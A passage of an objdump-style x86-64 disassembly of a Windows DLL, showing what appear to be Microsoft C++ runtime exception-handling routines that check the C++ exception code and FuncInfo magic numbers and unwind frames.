   180003ed8:	85 ed                	test   %ebp,%ebp
   180003eda:	74 0a                	je     0x180003ee6
   180003edc:	e8 ef ef ff ff       	call   0x180002ed0
   180003ee1:	48 03 c5             	add    %rbp,%rax
   180003ee4:	75 1c                	jne    0x180003f02
   180003ee6:	8b 03                	mov    (%rbx),%eax
   180003ee8:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   180003eed:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   180003ef2:	0f 82 b9 00 00 00    	jb     0x180003fb1
   180003ef8:	f6 43 24 04          	testb  $0x4,0x24(%rbx)
   180003efc:	0f 84 af 00 00 00    	je     0x180003fb1
   180003f02:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   180003f08:	75 6d                	jne    0x180003f77
   180003f0a:	83 7f 18 03          	cmpl   $0x3,0x18(%rdi)
   180003f0e:	72 67                	jb     0x180003f77
   180003f10:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   180003f17:	76 5e                	jbe    0x180003f77
   180003f19:	48 8b 47 30          	mov    0x30(%rdi),%rax
   180003f1d:	48 63 68 08          	movslq 0x8(%rax),%rbp
   180003f21:	85 ed                	test   %ebp,%ebp
   180003f23:	74 52                	je     0x180003f77
   180003f25:	e8 c6 ef ff ff       	call   0x180002ef0
   180003f2a:	48 03 c5             	add    %rbp,%rax
   180003f2d:	74 48                	je     0x180003f77
   180003f2f:	0f b6 8c 24 c8 00 00 	movzbl 0xc8(%rsp),%ecx
   180003f36:	00 
   180003f37:	4c 8b ce             	mov    %rsi,%r9
   180003f3a:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   180003f3e:	4d 8b c7             	mov    %r15,%r8
   180003f41:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   180003f48:	00 
   180003f49:	49 8b d6             	mov    %r14,%rdx
   180003f4c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180003f51:	8b 8c 24 b8 00 00 00 	mov    0xb8(%rsp),%ecx
   180003f58:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   180003f5c:	48 8b cf             	mov    %rdi,%rcx
   180003f5f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180003f64:	ff 15 ee b2 00 00    	call   *0xb2ee(%rip)        # 0x18000f258
   180003f6a:	48 83 c4 58          	add    $0x58,%rsp
   180003f6e:	41 5f                	pop    %r15
   180003f70:	41 5e                	pop    %r14
   180003f72:	5f                   	pop    %rdi
   180003f73:	5e                   	pop    %rsi
   180003f74:	5d                   	pop    %rbp
   180003f75:	5b                   	pop    %rbx
   180003f76:	c3                   	ret
   180003f77:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   180003f7e:	00 
   180003f7f:	4c 8b ce             	mov    %rsi,%r9
   180003f82:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180003f87:	4d 8b c7             	mov    %r15,%r8
   180003f8a:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   180003f91:	49 8b d6             	mov    %r14,%rdx
   180003f94:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003f98:	48 8b cf             	mov    %rdi,%rcx
   180003f9b:	0f b6 84 24 c8 00 00 	movzbl 0xc8(%rsp),%eax
   180003fa2:	00 
   180003fa3:	88 44 24 28          	mov    %al,0x28(%rsp)
   180003fa7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180003fac:	e8 af f4 ff ff       	call   0x180003460
   180003fb1:	b8 01 00 00 00       	mov    $0x1,%eax
   180003fb6:	48 83 c4 58          	add    $0x58,%rsp
   180003fba:	41 5f                	pop    %r15
   180003fbc:	41 5e                	pop    %r14
   180003fbe:	5f                   	pop    %rdi
   180003fbf:	5e                   	pop    %rsi
   180003fc0:	5d                   	pop    %rbp
   180003fc1:	5b                   	pop    %rbx
   180003fc2:	c3                   	ret
   180003fc3:	e8 a8 1a 00 00       	call   0x180005a70
   180003fc8:	cc                   	int3
   180003fc9:	cc                   	int3
   180003fca:	cc                   	int3
   180003fcb:	cc                   	int3
   180003fcc:	cc                   	int3
   180003fcd:	cc                   	int3
   180003fce:	cc                   	int3
   180003fcf:	cc                   	int3
   180003fd0:	0f b6 44 24 40       	movzbl 0x40(%rsp),%eax
   180003fd5:	88 44 24 40          	mov    %al,0x40(%rsp)
   180003fd9:	e9 c2 fd ff ff       	jmp    0x180003da0
   180003fde:	cc                   	int3
   180003fdf:	cc                   	int3
   180003fe0:	40 53                	rex push %rbx
   180003fe2:	48 83 ec 20          	sub    $0x20,%rsp
   180003fe6:	48 8b d9             	mov    %rcx,%rbx
   180003fe9:	48 8b c2             	mov    %rdx,%rax
   180003fec:	48 8d 0d cd c1 00 00 	lea    0xc1cd(%rip),%rcx        # 0x1800101c0
   180003ff3:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003ff6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180003ffa:	48 89 0b             	mov    %rcx,(%rbx)
   180003ffd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180004001:	0f 11 02             	movups %xmm0,(%rdx)
   180004004:	e8 a7 07 00 00       	call   0x1800047b0
   180004009:	48 8d 05 e0 c1 00 00 	lea    0xc1e0(%rip),%rax        # 0x1800101f0
   180004010:	48 89 03             	mov    %rax,(%rbx)
   180004013:	48 8b c3             	mov    %rbx,%rax
   180004016:	48 83 c4 20          	add    $0x20,%rsp
   18000401a:	5b                   	pop    %rbx
   18000401b:	c3                   	ret
   18000401c:	cc                   	int3
   18000401d:	cc                   	int3
   18000401e:	cc                   	int3
   18000401f:	cc                   	int3
   180004020:	48 8d 05 d9 c1 00 00 	lea    0xc1d9(%rip),%rax        # 0x180010200
   180004027:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   18000402e:	00 
   18000402f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180004033:	48 8d 05 b6 c1 00 00 	lea    0xc1b6(%rip),%rax        # 0x1800101f0
   18000403a:	48 89 01             	mov    %rax,(%rcx)
   18000403d:	48 8b c1             	mov    %rcx,%rax
   180004040:	c3                   	ret
   180004041:	cc                   	int3
   180004042:	cc                   	int3
   180004043:	cc                   	int3
   180004044:	cc                   	int3
   180004045:	cc                   	int3
   180004046:	cc                   	int3
   180004047:	cc                   	int3
   180004048:	cc                   	int3
   180004049:	cc                   	int3
   18000404a:	cc                   	int3
   18000404b:	cc                   	int3
   18000404c:	cc                   	int3
   18000404d:	cc                   	int3
   18000404e:	cc                   	int3
   18000404f:	cc                   	int3
   180004050:	40 53                	rex push %rbx
   180004052:	48 83 ec 20          	sub    $0x20,%rsp
   180004056:	48 8b d9             	mov    %rcx,%rbx
   180004059:	48 8b c2             	mov    %rdx,%rax
   18000405c:	48 8d 0d 5d c1 00 00 	lea    0xc15d(%rip),%rcx        # 0x1800101c0
   180004063:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004066:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000406a:	48 89 0b             	mov    %rcx,(%rbx)
   18000406d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180004071:	0f 11 02             	movups %xmm0,(%rdx)
   180004074:	e8 37 07 00 00       	call   0x1800047b0
   180004079:	48 8b c3             	mov    %rbx,%rax
   18000407c:	48 83 c4 20          	add    $0x20,%rsp
   180004080:	5b                   	pop    %rbx
   180004081:	c3                   	ret
   180004082:	cc                   	int3
   180004083:	cc                   	int3
   180004084:	cc                   	int3
   180004085:	cc                   	int3
   180004086:	cc                   	int3
   180004087:	cc                   	int3
   180004088:	cc                   	int3
   180004089:	cc                   	int3
   18000408a:	cc                   	int3
   18000408b:	cc                   	int3
   18000408c:	cc                   	int3
   18000408d:	cc                   	int3
   18000408e:	cc                   	int3
   18000408f:	cc                   	int3
   180004090:	48 8d 05 29 c1 00 00 	lea    0xc129(%rip),%rax        # 0x1800101c0
   180004097:	48 89 01             	mov    %rax,(%rcx)
   18000409a:	48 83 c1 08          	add    $0x8,%rcx
   18000409e:	e9 ad 07 00 00       	jmp    0x180004850
   1800040a3:	cc                   	int3
   1800040a4:	cc                   	int3
   1800040a5:	cc                   	int3
   1800040a6:	cc                   	int3
   1800040a7:	cc                   	int3
   1800040a8:	cc                   	int3
   1800040a9:	cc                   	int3
   1800040aa:	cc                   	int3
   1800040ab:	cc                   	int3
   1800040ac:	cc                   	int3
   1800040ad:	cc                   	int3
   1800040ae:	cc                   	int3
   1800040af:	cc                   	int3
   1800040b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800040b5:	57                   	push   %rdi
   1800040b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800040ba:	48 8d 05 ff c0 00 00 	lea    0xc0ff(%rip),%rax        # 0x1800101c0
   1800040c1:	48 8b f9             	mov    %rcx,%rdi
   1800040c4:	48 89 01             	mov    %rax,(%rcx)
   1800040c7:	8b da                	mov    %edx,%ebx
   1800040c9:	48 83 c1 08          	add    $0x8,%rcx
   1800040cd:	e8 7e 07 00 00       	call   0x180004850
   1800040d2:	f6 c3 01             	test   $0x1,%bl
   1800040d5:	74 0d                	je     0x1800040e4
   1800040d7:	ba 18 00 00 00       	mov    $0x18,%edx
   1800040dc:	48 8b cf             	mov    %rdi,%rcx
   1800040df:	e8 bc 8f 00 00       	call   0x18000d0a0
   1800040e4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800040e9:	48 8b c7             	mov    %rdi,%rax
   1800040ec:	48 83 c4 20          	add    $0x20,%rsp
   1800040f0:	5f                   	pop    %rdi
   1800040f1:	c3                   	ret
   1800040f2:	cc                   	int3
   1800040f3:	cc                   	int3
   1800040f4:	cc                   	int3
   1800040f5:	cc                   	int3
   1800040f6:	cc                   	int3
   1800040f7:	cc                   	int3
   1800040f8:	cc                   	int3
   1800040f9:	cc                   	int3
   1800040fa:	cc                   	int3
   1800040fb:	cc                   	int3
   1800040fc:	cc                   	int3
   1800040fd:	cc                   	int3
   1800040fe:	cc                   	int3
   1800040ff:	cc                   	int3
   180004100:	40 53                	rex push %rbx
   180004102:	56                   	push   %rsi
   180004103:	57                   	push   %rdi
   180004104:	41 54                	push   %r12
   180004106:	41 55                	push   %r13
   180004108:	41 56                	push   %r14
   18000410a:	41 57                	push   %r15
   18000410c:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   180004113:	48 8b f9             	mov    %rcx,%rdi
   180004116:	33 c0                	xor    %eax,%eax
   180004118:	44 8b f8             	mov    %eax,%r15d
   18000411b:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000411f:	89 84 24 d0 00 00 00 	mov    %eax,0xd0(%rsp)
   180004126:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000412b:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   180004132:	00 
   180004133:	e8 68 e4 ff ff       	call   0x1800025a0
   180004138:	4c 8b 68 28          	mov    0x28(%rax),%r13
   18000413c:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   180004141:	4c 89 6c 24 78       	mov    %r13,0x78(%rsp)
   180004146:	e8 55 e4 ff ff       	call   0x1800025a0
   18000414b:	48 8b 40 20          	mov    0x20(%rax),%rax
   18000414f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180004154:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180004159:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   18000415e:	48 8b 77 50          	mov    0x50(%rdi),%rsi
   180004162:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   180004167:	48 89 b4 24 d8 00 00 	mov    %rsi,0xd8(%rsp)
   18000416e:	00 
   18000416f:	48 8b 47 48          	mov    0x48(%rdi),%rax
   180004173:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   18000417a:	00 
   18000417b:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180004180:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   180004184:	48 8b 47 30          	mov    0x30(%rdi),%rax
   180004188:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000418d:	4c 8b 77 28          	mov    0x28(%rdi),%r14
   180004191:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   180004196:	48 8b cb             	mov    %rbx,%rcx
   180004199:	e8 42 e3 ff ff       	call   0x1800024e0
   18000419e:	e8 fd e3 ff ff       	call   0x1800025a0
   1800041a3:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1800041a7:	e8 f4 e3 ff ff       	call   0x1800025a0
   1800041ac:	48 89 58 28          	mov    %rbx,0x28(%rax)
   1800041b0:	e8 eb e3 ff ff       	call   0x1800025a0
   1800041b5:	48 8b 50 20          	mov    0x20(%rax),%rdx
   1800041b9:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   1800041bd:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1800041c4:	00 
   1800041c5:	e8 66 ec ff ff       	call   0x180002e30
   1800041ca:	4c 8b e0             	mov    %rax,%r12
   1800041cd:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800041d2:	4c 39 7f 58          	cmp    %r15,0x58(%rdi)
   1800041d6:	74 1c                	je     0x1800041f4
   1800041d8:	c7 84 24 d0 00 00 00 	movl   $0x1,0xd0(%rsp)
   1800041df:	01 00 00 00 
   1800041e3:	e8 b8 e3 ff ff       	call   0x1800025a0
   1800041e8:	48 8b 50 70          	mov    0x70(%rax),%rdx
   1800041ec:	48 89 94 24 e0 00 00 	mov    %rdx,0xe0(%rsp)
   1800041f3:	00 
   1800041f4:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1800041fa:	49 8b d6             	mov    %r14,%rdx
   1800041fd:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180004202:	e8 69 05 00 00       	call   0x180004770
   180004207:	48 8b d8             	mov    %rax,%rbx
   18000420a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000420f:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180004214:	eb 78                	jmp    0x18000428e
   180004216:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   18000421d:	00 
   18000421e:	e8 7d e3 ff ff       	call   0x1800025a0
   180004223:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%rax)
   18000422a:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   180004231:	00 
   180004232:	83 bc 24 d0 00 00 00 	cmpl   $0x0,0xd0(%rsp)
   180004239:	00 
   18000423a:	74 0f                	je     0x18000424b
   18000423c:	b2 01                	mov    $0x1,%dl
   18000423e:	e8 bd e0 ff ff       	call   0x180002300
   180004243:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   18000424a:	00 
   18000424b:	4c 8d 49 20          	lea    0x20(%rcx),%r9
   18000424f:	44 8b 41 18          	mov    0x18(%rcx),%r8d
   180004253:	8b 51 04             	mov    0x4(%rcx),%edx
   180004256:	8b 09                	mov    (%rcx),%ecx
   180004258:	ff 15 72 ae 00 00    	call   *0xae72(%rip)        # 0x18000f0d0
   18000425e:	44 8b 7c 24 20       	mov    0x20(%rsp),%r15d
   180004263:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180004268:	4c 8b 64 24 30       	mov    0x30(%rsp),%r12
   18000426d:	4c 8b 6c 24 48       	mov    0x48(%rsp),%r13
   180004272:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   180004277:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   18000427c:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180004281:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   180004288:	00 
   180004289:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
   18000428e:	49 8b cc             	mov    %r12,%rcx
   180004291:	e8 da eb ff ff       	call   0x180002e70
   180004296:	45 85 ff             	test   %r15d,%r15d
   180004299:	75 32                	jne    0x1800042cd
   18000429b:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   1800042a1:	75 2a                	jne    0x1800042cd
   1800042a3:	83 7e 18 04          	cmpl   $0x4,0x18(%rsi)
   1800042a7:	75 24                	jne    0x1800042cd
   1800042a9:	8b 46 20             	mov    0x20(%rsi),%eax
   1800042ac:	2d 20 05 93 19       	sub    $0x19930520,%eax
   1800042b1:	83 f8 02             	cmp    $0x2,%eax
   1800042b4:	77 17                	ja     0x1800042cd
   1800042b6:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   1800042ba:	e8 c1 e0 ff ff       	call   0x180002380
   1800042bf:	85 c0                	test   %eax,%eax
   1800042c1:	74 0a                	je     0x1800042cd
   1800042c3:	b2 01                	mov    $0x1,%dl
   1800042c5:	48 8b ce             	mov    %rsi,%rcx
   1800042c8:	e8 33 e0 ff ff       	call   0x180002300
   1800042cd:	e8 ce e2 ff ff       	call   0x1800025a0
   1800042d2:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800042d6:	e8 c5 e2 ff ff       	call   0x1800025a0
   1800042db:	4c 89 68 28          	mov    %r13,0x28(%rax)
   1800042df:	48 8b 84 24 e8 00 00 	mov    0xe8(%rsp),%rax
   1800042e6:	00 
   1800042e7:	48 63 48 1c          	movslq 0x1c(%rax),%rcx
   1800042eb:	49 8b 06             	mov    (%r14),%rax
   1800042ee:	48 c7 04 01 fe ff ff 	movq   $0xfffffffffffffffe,(%rcx,%rax,1)
   1800042f5:	ff 
   1800042f6:	48 8b c3             	mov    %rbx,%rax
   1800042f9:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   180004300:	41 5f                	pop    %r15
   180004302:	41 5e                	pop    %r14
   180004304:	41 5d                	pop    %r13
   180004306:	41 5c                	pop    %r12
   180004308:	5f                   	pop    %rdi
   180004309:	5e                   	pop    %rsi
   18000430a:	5b                   	pop    %rbx
   18000430b:	c3                   	ret
   18000430c:	cc                   	int3
   18000430d:	cc                   	int3
   18000430e:	cc                   	int3
   18000430f:	cc                   	int3
   180004310:	40 53                	rex push %rbx
   180004312:	48 83 ec 20          	sub    $0x20,%rsp
   180004316:	4c 8b 09             	mov    (%rcx),%r9
   180004319:	49 8b d8             	mov    %r8,%rbx
   18000431c:	41 c7 00 00 00 00 00 	movl   $0x0,(%r8)
   180004323:	41 81 39 63 73 6d e0 	cmpl   $0xe06d7363,(%r9)
   18000432a:	75 69                	jne    0x180004395
   18000432c:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   180004331:	75 1f                	jne    0x180004352
   180004333:	41 8b 41 20          	mov    0x20(%r9),%eax
   180004337:	2d 20 05 93 19       	sub    $0x19930520,%eax
   18000433c:	83 f8 02             	cmp    $0x2,%eax
   18000433f:	77 11                	ja     0x180004352
   180004341:	48 8b 42 28          	mov    0x28(%rdx),%rax
   180004345:	49 39 41 28          	cmp    %rax,0x28(%r9)
   180004349:	75 07                	jne    0x180004352
   18000434b:	41 c7 00 01 00 00 00 	movl   $0x1,(%r8)
   180004352:	41 81 39 63 73 6d e0 	cmpl   $0xe06d7363,(%r9)
   180004359:	75 3a                	jne    0x180004395
   18000435b:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   180004360:	75 33                	jne    0x180004395
   180004362:	41 8b 49 20          	mov    0x20(%r9),%ecx
   180004366:	81 e9 20 05 93 19    	sub    $0x19930520,%ecx
   18000436c:	83 f9 02             	cmp    $0x2,%ecx
   18000436f:	77 24                	ja     0x180004395
   180004371:	49 83 79 30 00       	cmpq   $0x0,0x30(%r9)
   180004376:	75 1d                	jne    0x180004395
   180004378:	e8 23 e2 ff ff       	call   0x1800025a0
   18000437d:	c7 40 40 01 00 00 00 	movl   $0x1,0x40(%rax)
   180004384:	b8 01 00 00 00       	mov    $0x1,%eax
   180004389:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   18000438f:	48 83 c4 20          	add    $0x20,%rsp
   180004393:	5b                   	pop    %rbx
   180004394:	c3                   	ret
   180004395:	33 c0                	xor    %eax,%eax
   180004397:	48 83 c4 20          	add    $0x20,%rsp
   18000439b:	5b                   	pop    %rbx
   18000439c:	c3                   	ret
   18000439d:	cc                   	int3
   18000439e:	cc                   	int3
   18000439f:	cc                   	int3
   1800043a0:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   1800043a5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800043aa:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800043af:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800043b4:	53                   	push   %rbx
   1800043b5:	56                   	push   %rsi
   1800043b6:	57                   	push   %rdi
   1800043b7:	41 54                	push   %r12
   1800043b9:	41 55                	push   %r13
   1800043bb:	41 56                	push   %r14
   1800043bd:	41 57                	push   %r15
   1800043bf:	48 83 ec 40          	sub    $0x40,%rsp
   1800043c3:	45 8b e1             	mov    %r9d,%r12d
   1800043c6:	49 8b f0             	mov    %r8,%rsi
   1800043c9:	48 8b da             	mov    %rdx,%rbx
   1800043cc:	4c 8b f9             	mov    %rcx,%r15
   1800043cf:	e8 fc ea ff ff       	call   0x180002ed0
   1800043d4:	4c 8b e8             	mov    %rax,%r13
   1800043d7:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800043dc:	4c 8b c6             	mov    %rsi,%r8
   1800043df:	48 8b d3             	mov    %rbx,%rdx
   1800043e2:	49 8b cf             	mov    %r15,%rcx
   1800043e5:	e8 e6 eb ff ff       	call   0x180002fd0
   1800043ea:	8b f8                	mov    %eax,%edi
   1800043ec:	e8 af e1 ff ff       	call   0x1800025a0
   1800043f1:	ff 40 30             	incl   0x30(%rax)
   1800043f4:	83 ff ff             	cmp    $0xffffffff,%edi
   1800043f7:	0f 84 f4 00 00 00    	je     0x1800044f1
   1800043fd:	41 3b fc             	cmp    %r12d,%edi
   180004400:	0f 8e eb 00 00 00    	jle    0x1800044f1
   180004406:	83 ff ff             	cmp    $0xffffffff,%edi
   180004409:	0f 8e 34 01 00 00    	jle    0x180004543
   18000440f:	3b 7e 04             	cmp    0x4(%rsi),%edi
   180004412:	0f 8d 2b 01 00 00    	jge    0x180004543
   180004418:	e8 b3 ea ff ff       	call   0x180002ed0
   18000441d:	4c 63 f7             	movslq %edi,%r14
   180004420:	49 c1 e6 03          	shl    $0x3,%r14
   180004424:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   180004428:	49 03 ce             	add    %r14,%rcx
   18000442b:	8b 3c 01             	mov    (%rcx,%rax,1),%edi
   18000442e:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   180004432:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   180004436:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   18000443a:	e8 91 ea ff ff       	call   0x180002ed0
   18000443f:	48 03 c3             	add    %rbx,%rax
   180004442:	42 83 7c 30 04 00    	cmpl   $0x0,0x4(%rax,%r14,1)
   180004448:	74 7b                	je     0x1800044c5
   18000444a:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   18000444e:	e8 7d ea ff ff       	call   0x180002ed0
   180004453:	48 03 c3             	add    %rbx,%rax
   180004456:	4a 63 5c 30 04       	movslq 0x4(%rax,%r14,1),%rbx
   18000445b:	e8 70 ea ff ff       	call   0x180002ed0
   180004460:	48 03 c3             	add    %rbx,%rax
   180004463:	74 60                	je     0x1800044c5
   180004465:	44 8b cf             	mov    %edi,%r9d
   180004468:	4c 8b c6             	mov    %rsi,%r8
   18000446b:	48 8b 94 24 88 00 00 	mov    0x88(%rsp),%rdx
   180004472:	00 
   180004473:	49 8b cf             	mov    %r15,%rcx
   180004476:	e8 15 ec ff ff       	call   0x180003090
   18000447b:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   18000447f:	e8 4c ea ff ff       	call   0x180002ed0
   180004484:	48 03 c3             	add    %rbx,%rax
   180004487:	42 83 7c 30 04 00    	cmpl   $0x0,0x4(%rax,%r14,1)
   18000448d:	74 1b                	je     0x1800044aa
   18000448f:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   180004493:	e8 38 ea ff ff       	call   0x180002ed0
   180004498:	48 03 c3             	add    %rbx,%rax
   18000449b:	4a 63 5c 30 04       	movslq 0x4(%rax,%r14,1),%rbx
   1800044a0:	e8 2b ea ff ff       	call   0x180002ed0
   1800044a5:	48 03 c3             	add    %rbx,%rax
   1800044a8:	eb 02                	jmp    0x1800044ac
   1800044aa:	33 c0                	xor    %eax,%eax
   1800044ac:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   1800044b2:	49 8b d7             	mov    %r15,%rdx
   1800044b5:	48 8b c8             	mov    %rax,%rcx
   1800044b8:	e8 b3 02 00 00       	call   0x180004770
   1800044bd:	49 8b cd             	mov    %r13,%rcx
   1800044c0:	e8 4b ea ff ff       	call   0x180002f10
   1800044c5:	eb 21                	jmp    0x1800044e8
   1800044c7:	44 8b a4 24 98 00 00 	mov    0x98(%rsp),%r12d
   1800044ce:	00 
   1800044cf:	48 8b b4 24 90 00 00 	mov    0x90(%rsp),%rsi
   1800044d6:	00 
   1800044d7:	4c 8b bc 24 80 00 00 	mov    0x80(%rsp),%r15
   1800044de:	00 
   1800044df:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   1800044e4:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   1800044e8:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   1800044ec:	e9 03 ff ff ff       	jmp    0x1800043f4
   1800044f1:	e8 aa e0 ff ff       	call   0x1800025a0
   1800044f6:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   1800044fa:	7e 08                	jle    0x180004504
   1800044fc:	e8 9f e0 ff ff       	call   0x1800025a0
   180004501:	ff 48 30             	decl   0x30(%rax)
   180004504:	83 ff ff             	cmp    $0xffffffff,%edi
   180004507:	74 05                	je     0x18000450e
   180004509:	41 3b fc             	cmp    %r12d,%edi
   18000450c:	7f 3b                	jg     0x180004549
   18000450e:	44 8b cf             	mov    %edi,%r9d
   180004511:	4c 8b c6             	mov    %rsi,%r8
   180004514:	48 8b 94 24 88 00 00 	mov    0x88(%rsp),%rdx
   18000451b:	00 
   18000451c:	49 8b cf             	mov    %r15,%rcx
   18000451f:	48 83 c4 40          	add    $0x40,%rsp
   180004523:	41 5f                	pop    %r15
   180004525:	41 5e                	pop    %r14
   180004527:	41 5d                	pop    %r13
   180004529:	41 5c                	pop    %r12
   18000452b:	5f                   	pop    %rdi
   18000452c:	5e                   	pop    %rsi
   18000452d:	5b                   	pop    %rbx
   18000452e:	e9 5d eb ff ff       	jmp    0x180003090
   180004533:	48 83 c4 40          	add    $0x40,%rsp
   180004537:	41 5f                	pop    %r15
   180004539:	41 5e                	pop    %r14
   18000453b:	41 5d                	pop    %r13
   18000453d:	41 5c                	pop    %r12
   18000453f:	5f                   	pop    %rdi
   180004540:	5e                   	pop    %rsi
   180004541:	5b                   	pop    %rbx
   180004542:	c3                   	ret
   180004543:	e8 28 15 00 00       	call   0x180005a70
   180004548:	90                   	nop
   180004549:	e8 22 15 00 00       	call   0x180005a70
   18000454e:	90                   	nop
   18000454f:	cc                   	int3
   180004550:	48 8b c4             	mov    %rsp,%rax
   180004553:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180004557:	56                   	push   %rsi
   180004558:	41 55                	push   %r13
   18000455a:	48 83 ec 48          	sub    $0x48,%rsp
   18000455e:	4c 8b ea             	mov    %rdx,%r13
   180004561:	48 8b f1             	mov    %rcx,%rsi
   180004564:	48 85 d2             	test   %rdx,%rdx
   180004567:	0f 84 e6 00 00 00    	je     0x180004653
   18000456d:	48 89 78 e0          	mov    %rdi,-0x20(%rax)
   180004571:	40 32 ff             	xor    %dil,%dil
   180004574:	4c 89 78 c8          	mov    %r15,-0x38(%rax)
   180004578:	45 33 ff             	xor    %r15d,%r15d
   18000457b:	40 88 7c 24 68       	mov    %dil,0x68(%rsp)
   180004580:	44 39 3a             	cmp    %r15d,(%rdx)
   180004583:	0f 8e b4 00 00 00    	jle    0x18000463d
   180004589:	48 89 58 18          	mov    %rbx,0x18(%rax)
   18000458d:	48 89 68 e8          	mov    %rbp,-0x18(%rax)
   180004591:	4c 89 60 d8          	mov    %r12,-0x28(%rax)
   180004595:	4c 89 70 d0          	mov    %r14,-0x30(%rax)
   180004599:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1800045a0:	48 8b 46 30          	mov    0x30(%rsi),%rax
   1800045a4:	4c 63 70 0c          	movslq 0xc(%rax),%r14
   1800045a8:	e8 43 e9 ff ff       	call   0x180002ef0
   1800045ad:	48 83 c0 04          	add    $0x4,%rax
   1800045b1:	4c 03 f0             	add    %rax,%r14
   1800045b4:	48 8b 46 30          	mov    0x30(%rsi),%rax
   1800045b8:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   1800045bc:	e8 2f e9 ff ff       	call   0x180002ef0
   1800045c1:	8b 1c 18             	mov    (%rax,%rbx,1),%ebx
   1800045c4:	85 db                	test   %ebx,%ebx
   1800045c6:	7e 54                	jle    0x18000461c
   1800045c8:	49 63 c7             	movslq %r15d,%rax
   1800045cb:	4c 8d 24 80          	lea    (%rax,%rax,4),%r12
   1800045cf:	90                   	nop
   1800045d0:	49 63 2e             	movslq (%r14),%rbp
   1800045d3:	e8 18 e9 ff ff       	call   0x180002ef0
   1800045d8:	48 8b 76 30          	mov    0x30(%rsi),%rsi
   1800045dc:	48 03 e8             	add    %rax,%rbp
   1800045df:	49 63 7d 04          	movslq 0x4(%r13),%rdi
   1800045e3:	e8 e8 e8 ff ff       	call   0x180002ed0
   1800045e8:	4c 8b c6             	mov    %rsi,%r8
   1800045eb:	48 8b d5             	mov    %rbp,%rdx
